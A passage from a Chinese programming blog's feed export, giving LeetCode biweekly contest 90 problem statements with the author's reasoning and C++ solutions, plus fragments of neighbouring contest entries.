class="type">int</span> i = L; i &lt;= M; i += <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> g = dp;</span><br><span class="line">                    <span class="type">int</span> x = (<span class="type">int</span>)s[i].<span class="built_in">size</span>() - <span class="number">1</span>, y = s[i].<span class="built_in">back</span>();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> j = x; j &lt;= limit; j += <span class="number">1</span>)</span><br><span class="line">                        g[j] = <span class="built_in">max</span>(g[j], dp[j - x] + y);</span><br><span class="line">                    dp.<span class="built_in">swap</span>(g);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">DFS</span>(M + <span class="number">1</span>, R);</span><br><span class="line">                dp = f;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">DFS</span>(<span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode biweekly contest 90</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/50/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-90"><a href="#leetcode-biweekly-contest-90" class="headerlink" title="leetcode biweekly contest 90"></a>leetcode biweekly contest 90</h2><p><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210292346848.png"></p>
<p>前三题都是水题，第四题想了半天没想出来简单的办法，直接单调栈加上线段树二分暴力，也没有想到更好的办法，除了菜没办法。</p>
<h4 id="6225-差值数组不同的字符串"><a href="#6225-差值数组不同的字符串" class="headerlink" title="6225. 差值数组不同的字符串"></a>6225. 差值数组不同的字符串</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个字符串数组 <code>words</code> ，每一个字符串长度都相同，令所有字符串的长度都为 <code>n</code> 。</p>
<p>每个字符串 <code>words[i]</code> 可以被转化为一个长度为 <code>n - 1</code> 的 差值整数数组 <code>difference[i] </code>，其中对于 <code>0 &lt;= j &lt;= n - 2 </code>有 <code>difference[i][j] = words[i][j+1] - words[i][j]</code> 。注意两个字母的差值定义为它们在字母表中 位置 之差，也就是说 <code>&#39;a&#39;</code> 的位置是 <code>0</code>，<code>&#39;b&#39;</code> 的位置是 <code>1</code> ，<code>&#39;z&#39;</code> 的位置是 <code>25</code> 。</p>
<p>比方说，字符串 <code>&quot;acb&quot;</code> 的差值整数数组是 <code>[2 - 0, 1 - 2] = [2, -1] </code>。<br><code>words</code> 中所有字符串 除了一个字符串以外 ，其他字符串的差值整数数组都相同。你需要找到那个不同的字符串。</p>
<p>请你返回 <code>words</code>中 差值整数数组 不同的字符串。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;adc&quot;,&quot;wzy&quot;,&quot;abc&quot;]</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line">解释：</span><br><span class="line">- &quot;adc&quot; 的差值整数数组是 [3 - 0, 2 - 3] = [3, -1] 。</span><br><span class="line">- &quot;wzy&quot; 的差值整数数组是 [25 - 22, 24 - 25]= [3, -1] 。</span><br><span class="line">- &quot;abc&quot; 的差值整数数组是 [1 - 0, 2 - 1] = [1, 1] 。</span><br><span class="line">不同的数组是 [1, 1]，所以返回对应的字符串，&quot;abc&quot;。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：words = [&quot;aaa&quot;,&quot;bob&quot;,&quot;ccc&quot;,&quot;ddd&quot;]</span><br><span class="line">输出：&quot;bob&quot;</span><br><span class="line">解释：除了 &quot;bob&quot; 的差值整数数组是 [13, -13] 以外，其他字符串的差值整数数组都是 [0, 0] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>3 &lt;= words.length &lt;= 100</code></li>
<li><code>n == words[i].length</code></li>
<li><code>2 &lt;= n &lt;= 20</code></li>
<li><code>words[i]</code> 只含有小写英文字母。</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-90/problems/odd-string-difference/">https://leetcode.cn/contest/biweekly-contest-90/problems/odd-string-difference/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟了，没啥好说的，暴力循环然后找到出现次数最少的即可</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">oddString</span><span class="params">(vector&lt;string&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        map&lt;vector&lt;<span class="type">int</span>&gt;, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; words.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt; words[i].<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                curr.<span class="built_in">emplace_back</span>(words[i][j] - words[i][j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[curr]++;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cnt[arr[i]] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> words[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6228-距离字典两次编辑以内的单词"><a href="#6228-距离字典两次编辑以内的单词" class="headerlink" title="6228. 距离字典两次编辑以内的单词"></a>6228. 距离字典两次编辑以内的单词</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你两个字符串数组 <code>queries</code> 和 <code>dictionary</code> 。数组中所有单词都只包含小写英文字母，且长度都相同。</p>
<p>一次 编辑 中，你可以从 <code>queries</code> 中选择一个单词，将任意一个字母修改成任何其他字母。从 <code>queries</code> 中找到所有满足以下条件的字符串：不超过 两次编辑内，字符串与 <code>dictionary</code> 中某个字符串相同。</p>
<p>请你返回 <code>queries</code> 中的单词列表，这些单词距离 <code>dictionary</code> 中的单词 编辑次数 不超过 两次 。单词返回的顺序需要与 <code>queries</code> 中原本顺序相同。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：queries = [&quot;word&quot;,&quot;note&quot;,&quot;ants&quot;,&quot;wood&quot;], dictionary = [&quot;wood&quot;,&quot;joke&quot;,&quot;moat&quot;]</span><br><span class="line">输出：[&quot;word&quot;,&quot;note&quot;,&quot;wood&quot;]</span><br><span class="line">解释：</span><br><span class="line">- 将 &quot;word&quot; 中的 &#x27;r&#x27; 换成 &#x27;o&#x27; ，得到 dictionary 中的单词 &quot;wood&quot; 。</span><br><span class="line">- 将 &quot;note&quot; 中的 &#x27;n&#x27; 换成 &#x27;j&#x27; 且将 &#x27;t&#x27; 换成 &#x27;k&#x27; ，得到 &quot;joke&quot; 。</span><br><span class="line">- &quot;ants&quot; 需要超过 2 次编辑才能得到 dictionary 中的单词。</span><br><span class="line">- &quot;wood&quot; 不需要修改（0 次编辑），就得到 dictionary 中相同的单词。</span><br><span class="line">所以我们返回 [&quot;word&quot;,&quot;note&quot;,&quot;wood&quot;] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：queries = [&quot;yes&quot;], dictionary = [&quot;not&quot;]</span><br><span class="line">输出：[]</span><br><span class="line">解释：</span><br><span class="line">&quot;yes&quot; 需要超过 2 次编辑才能得到 &quot;not&quot; 。</span><br><span class="line">所以我们返回空数组。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= queries.length, dictionary.length &lt;= 100</code></li>
<li><code>n == queries[i].length == dictionary[j].length</code></li>
<li><code>1 &lt;= n &lt;= 100</code></li>
<li>所有 <code>queries[i]</code> 和 <code>dictionary[j]</code> 都只包含小写英文字母。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-90/problems/words-within-two-edits-of-dictionary/">https://leetcode.cn/contest/biweekly-contest-90/problems/words-within-two-edits-of-dictionary/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>遍历
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>这个题目也是暴力循环即可，直接计算两个字符串的编辑距离即可，非常简单的题目了。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(nm)$，其中 $n$ 表示给定的数组的长度,$m$ 表示字符串的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">diff</span><span class="params">(string &amp;a, string &amp;b)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; a.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i] != b[i]) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">twoEditWords</span><span class="params">(vector&lt;string&gt;&amp; queries, vector&lt;string&gt;&amp; dictionary)</span> </span>&#123;</span><br><span class="line">        vector&lt;string&gt; ans;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;a : queries) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;b : dictionary) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">diff</span>(a, b) &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">                    ans.<span class="built_in">emplace_back</span>(a);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6226-摧毁一系列目标"><a href="#6226-摧毁一系列目标" class="headerlink" title="6226. 摧毁一系列目标"></a>6226. 摧毁一系列目标</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的数组 <code>nums</code> ，它包含若干正整数，表示数轴上你需要摧毁的目标所在的位置。同时给你一个整数 <code>space</code> 。</p>
<p>你有一台机器可以摧毁目标。给机器 输入 <code>nums[i]</code> ，这台机器会摧毁所有位置在 <code>nums[i] + c * space</code> 的目标，其中 <code>c</code> 是任意非负整数。你想摧毁 <code>nums</code> 中 尽可能多 的目标。</p>
<p>请你返回在摧毁数目最多的前提下，<code>nums[i]</code> 的 最小值 。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,7,8,1,1,5], space = 2</span><br><span class="line">输出：1</span><br><span class="line">解释：如果我们输入 nums[3] ，我们可以摧毁位于 1,3,5,7,9,... 这些位置的目标。</span><br><span class="line">这种情况下， 我们总共可以摧毁 5 个目标（除了 nums[2]）。</span><br><span class="line">没有办法摧毁多于 5 个目标，所以我们返回 nums[3] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,3,5,2,4,6], space = 2</span><br><span class="line">输出：1</span><br><span class="line">解释：输入 nums[0] 或者 nums[3] 都会摧毁 3 个目标。</span><br><span class="line">没有办法摧毁多于 3 个目标。</span><br><span class="line">由于 nums[0] 是最小的可以摧毁 3 个目标的整数，所以我们返回 1 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [6,2,5], space = 100</span><br><span class="line">输出：2</span><br><span class="line">解释：无论我们输入哪个数字，都只能摧毁 1 个目标。输入的最小整数是 nums[1] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
<li><code>1 &lt;= space &lt;= 109</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-90/problems/destroy-sequential-targets/">https://leetcode.cn/contest/biweekly-contest-90/problems/destroy-sequential-targets/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>数学问题
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>通过分析可以知道如果 $x$ 与 $y$ 按照题目要求可以变换，则一定满足 $x \mod space &#x3D; y \mod space$。此时我们对于每个 $nums[i]$ 只需要统计出 $nums[i] \mod space$ 的个数即可。</li>
<li>最后我们按照题目要做只需要找到 $nums[i] \mod space$ 的最大数目，且满足 $nums[i]$ 最小即可。</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为数组的长度。</li>
<li>空间复杂度：时间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">destroyTargets</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> space)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            cnt[nums[i] % space]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>, freq = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i] % space;</span><br><span class="line">            <span class="keyword">if</span> (cnt[x] &gt; freq || (cnt[x] == freq &amp;&amp; nums[i] &lt; ans)) &#123;</span><br><span class="line">                ans = nums[i];</span><br><span class="line">                freq = cnt[x];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6227-下一个更大元素-IV"><a href="#6227-下一个更大元素-IV" class="headerlink" title="6227. 下一个更大元素 IV"></a>6227. 下一个更大元素 IV</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的非负整数数组 <code>nums</code> 。对于 <code>nums</code> 中每一个整数，你必须找到对应元素的 第二大 整数。</p>
<p>如果 <code>nums[j]</code> 满足以下条件，那么我们称它为 <code>nums[i]</code> 的 第二大 整数：</p>
<ul>
<li><code>j &gt; i</code></li>
<li><code>nums[j] &gt; nums[i]</code><br>恰好存在 一个 <code>k</code> 满足 <code>i &lt; k &lt; j</code> 且 <code>nums[k] &gt; nums[i]</code> 。<br>如果不存在 <code>nums[j]</code> ，那么第二大整数为 <code>-1</code> 。</li>
</ul>
<p>比方说，数组 <code>[1, 2, 4, 3] </code>中，<code>1</code> 的第二大整数是 <code>4 </code>，<code>2</code> 的第二大整数是 <code>3</code> ，<code>3</code> 和 <code>4 </code>的第二大整数是 -1 。<br>请你返回一个整数数组 <code>answer</code> ，其中 <code>answer[i]</code>是 <code>nums[i]</code> 的第二大整数。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [2,4,0,9,6]</span><br><span class="line">输出：[9,6,6,-1,-1]</span><br><span class="line">解释：</span><br><span class="line">下标为 0 处：2 的右边，4 是大于 2 的第一个整数，9 是第二个大于 2 的整数。</span><br><span class="line">下标为 1 处：4 的右边，9 是大于 4 的第一个整数，6 是第二个大于 4 的整数。</span><br><span class="line">下标为 2 处：0 的右边，9 是大于 0 的第一个整数，6 是第二个大于 0 的整数。</span><br><span class="line">下标为 3 处：右边不存在大于 9 的整数，所以第二大整数为 -1 。</span><br><span class="line">下标为 4 处：右边不存在大于 6 的整数，所以第二大整数为 -1 。</span><br><span class="line">所以我们返回 [9,6,6,-1,-1] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,3]</span><br><span class="line">输出：[-1,-1]</span><br><span class="line">解释：</span><br><span class="line">由于每个数右边都没有更大的数，所以我们返回 [-1,-1] 。</span><br></pre></td></tr></table></figure>
<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>0 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-90/problems/next-greater-element-iv/">https://leetcode.cn/contest/biweekly-contest-90/problems/next-greater-element-iv/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 数学问题</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们将本题拆分成两个子问题：</li>
</ol>
<ul>
<li>下一个更大的元素；</li>
<li>从 $i$ 开始找到第一个比 $x$ 大的数；<br>如果上面两个子问题都可以解决，那么本题就是一个常规题目了。</li>
</ul>
<ol start="2">
<li>首先我们找到每个元素 $nums[i]$ 下一个更大元素的位置为 $j$，然后从 $j + 1$ 处开始查找第一个比 $nums[i]$ 大的元素，此时我们可以利用线段树上二分查找。</li>
<li>排序也非常简单的问题，排序也是非常好的思路来解决该问题，我们将所有的元素按照从大道小的顺序进行排序，同时对于相同的元素按照索引的小到大的顺序来进行排序，此时我们从大到小依次将元素的索引加入到有序集合中，保证每次加入 $nums[i]$ 时，集合中只保存大于 $nums[i]$ 的元素，每次我们查询有序集合中第一个大于 $i$ 的索引为 $j$ 即可，再往后移动一个元素即可。</li>
<li></li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n \log n)$，其中 $n$ 表示给定的数组的长度。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 表示给定的数组的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">secondGreaterElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">right</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        stack&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">        st.<span class="built_in">emplace</span>(n - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!st.<span class="built_in">empty</span>() &amp;&amp; nums[st.<span class="built_in">top</span>()] &lt;= nums[i]) &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                right[i] = st.<span class="built_in">top</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            st.<span class="built_in">emplace</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">this</span>-&gt;tmax = <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n * <span class="number">4</span> + <span class="number">10</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;nums = nums;</span><br><span class="line">        <span class="built_in">buildTree</span>(<span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (right[i] != <span class="number">-1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> x = <span class="built_in">queryRight</span>(right[i] + <span class="number">1</span>, nums[i], <span class="number">0</span>, n - <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">                ans[i] = x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;        </span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">buildTree</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            tmax[idx] = nums[l];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">buildTree</span>(l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            <span class="built_in">buildTree</span>(mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            tmax[idx] = <span class="built_in">max</span>(tmax[idx * <span class="number">2</span>], tmax[idx * <span class="number">2</span> + <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">queryRight</span><span class="params">(<span class="type">int</span> start, <span class="type">int</span> val, <span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> idx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (r &lt; start) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (tmax[idx] &lt;= val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">            <span class="keyword">return</span> nums[l];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">int</span> mid = (l + r) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span> (tmax[idx * <span class="number">2</span>] &gt; val) &#123;</span><br><span class="line">                ret = <span class="built_in">queryRight</span>(start, val, l, mid, idx * <span class="number">2</span>);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="number">-1</span>) &#123;</span><br><span class="line">                ret = <span class="built_in">queryRight</span>(start, val, mid + <span class="number">1</span>, r, idx * <span class="number">2</span> + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; tmax;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li>排序 + 二分查找<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">secondGreaterElement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; arr;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            arr.<span class="built_in">emplace_back</span>(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), [](<span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;a, <span class="type">const</span> pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;b) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a.first == b.first) &#123;</span><br><span class="line">                <span class="keyword">return</span> a.second &lt; b.second;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">return</span> a.first &gt; b.first;</span><br><span class="line">        &#125;);</span><br><span class="line">        set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">ans</span><span class="params">(n, <span class="number">-1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> [x, i] : arr) &#123;</span><br><span class="line">            <span class="keyword">auto</span> it = cnt.<span class="built_in">lower_bound</span>(i);</span><br><span class="line">            <span class="keyword">if</span> (it != cnt.<span class="built_in">end</span>() &amp;&amp; (++it) != cnt.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                ans[i] = nums[*it];</span><br><span class="line">            &#125;</span><br><span class="line">            cnt.<span class="built_in">emplace</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode contest 317</title>
    <url>/2022/11/02/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/51/</url>
    <content><![CDATA[<h2 id="leetcode-contest-317"><a href="#leetcode-contest-317" class="headerlink" title="leetcode contest 317"></a>leetcode contest 317</h2><p>周赛题目不错，大都有一些难度的题目，还算不错的周赛题目。</p>
